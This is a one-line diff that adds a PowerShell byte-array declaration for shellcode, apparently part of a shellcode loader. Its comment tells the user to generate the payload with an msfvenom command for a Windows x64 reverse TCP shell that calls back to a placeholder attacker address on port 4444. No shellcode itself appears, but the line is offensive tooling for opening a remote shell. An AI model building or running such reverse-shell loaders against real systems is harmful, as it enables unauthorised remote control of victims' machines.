@@ -1,0 +1,1 @@
+[Byte[]] $buf = # YOUR SHELL CODE HERE - msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f powershell
